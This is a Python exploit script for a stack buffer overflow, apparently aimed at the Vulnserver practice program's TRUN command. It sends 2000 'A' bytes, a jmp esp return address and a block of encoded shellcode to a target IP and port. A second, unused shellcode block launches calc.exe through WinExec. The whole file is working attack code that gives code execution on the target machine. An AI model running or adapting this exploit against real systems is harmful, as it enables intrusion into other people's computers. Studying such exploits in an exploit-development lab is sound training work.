
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

if len(sys.argv) != 3:
	print("[-]Usage: python %s <ip> <port>" % sys.argv[0])
	print ("[-]Exemple: python %s 192.168.1.18 9999" % sys.argv[0])
	sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])
# 625011AF==> jmp esp
eip = "\xAF\x11\x50\x62"

buf =  b""
buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x83\xdd\xfe\x85\x83\xee\xfc\xe2\xf4\x7f\x35"
buf += b"\x7c\x85\x83\xdd\x9e\x0c\x66\xec\x3e\xe1\x08\x8d\xce"
buf += b"\x0e\xd1\xd1\x75\xd7\x97\x56\x8c\xad\x8c\x6a\xb4\xa3"
buf += b"\xb2\x22\x52\xb9\xe2\xa1\xfc\xa9\xa3\x1c\x31\x88\x82"
buf += b"\x1a\x1c\x77\xd1\x8a\x75\xd7\x93\x56\xb4\xb9\x08\x91"
buf += b"\xef\xfd\x60\x95\xff\x54\xd2\x56\xa7\xa5\x82\x0e\x75"
buf += b"\xcc\x9b\x3e\xc4\xcc\x08\xe9\x75\x84\x55\xec\x01\x29"
buf += b"\x42\x12\xf3\x84\x44\xe5\x1e\xf0\x75\xde\x83\x7d\xb8"
buf += b"\xa0\xda\xf0\x67\x85\x75\xdd\xa7\xdc\x2d\xe3\x08\xd1"
buf += b"\xb5\x0e\xdb\xc1\xff\x56\x08\xd9\x75\x84\x53\x54\xba"
buf += b"\xa1\xa7\x86\xa5\xe4\xda\x87\xaf\x7a\x63\x82\xa1\xdf"
buf += b"\x08\xcf\x15\x08\xde\xb5\xcd\xb7\x83\xdd\x96\xf2\xf0"
buf += b"\xef\xa1\xd1\xeb\x91\x89\xa3\x84\x22\x2b\x3d\x13\xdc"
buf += b"\xfe\x85\xaa\x19\xaa\xd5\xeb\xf4\x7e\xee\x83\x22\x2b"
buf += b"\xd5\xd3\x8d\xae\xc5\xd3\x9d\xae\xed\x69\xd2\x21\x65"
buf += b"\x7c\x08\x69\xef\x86\xb5\x3e\x2d\xf3\x5e\x96\x87\x83"
buf += b"\xcc\xa2\x0c\x65\xb7\xee\xd3\xd4\xb5\x67\x20\xf7\xbc"
buf += b"\x01\x50\x06\x1d\x8a\x89\x7c\x93\xf6\xf0\x6f\xb5\x0e"
buf += b"\x30\x21\x8b\x01\x50\xeb\xbe\x93\xe1\x83\x54\x1d\xd2"
buf += b"\xd4\x8a\xcf\x73\xe9\xcf\xa7\xd3\x61\x20\x98\x42\xc7"
buf += b"\xf9\xc2\x84\x82\x50\xba\xa1\x93\x1b\xfe\xc1\xd7\x8d"
buf += b"\xa8\xd3\xd5\x9b\xa8\xcb\xd5\x8b\xad\xd3\xeb\xa4\x32"
buf += b"\xba\x05\x22\x2b\x0c\x63\x93\xa8\xc3\x7c\xed\x96\x8d"
buf += b"\x04\xc0\x9e\x7a\x56\x66\x0e\x30\x21\x8b\x96\x23\x16"
buf += b"\x60\x63\x7a\x56\xe1\xf8\xf9\x89\x5d\x05\x65\xf6\xd8"
buf += b"\x45\xc2\x90\xaf\x91\xef\x83\x8e\x01\x50"# 348      625011AF==> jmp esp   529


shellcode  =b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode +=b"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode +=b"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode +=b"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode +=b"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode +=b"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode +=b"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode +=b"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode +=b"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode +=b"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
shellcode +=b"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode +=b"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode +=b"\x52\xff\xd0" #195
#shell = (50 * "\x90").encode()+buf

#1998* "A" +"\xC2"

payload = ( "A" * 2000+ eip).encode() +buf  #buf + (129* "c").encode()

#test = (1998* "A" +"\xC2" ).encode()+eip.encode()+shell + (129* "c").encode()

print ("[+]Connecting with server...")
sleep(1)
try:
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port))
	s.send("TRUN /..:/ ".encode() + payload)
	s.close()
except:
	print ("[*]Error in connection with server: "+ip)
            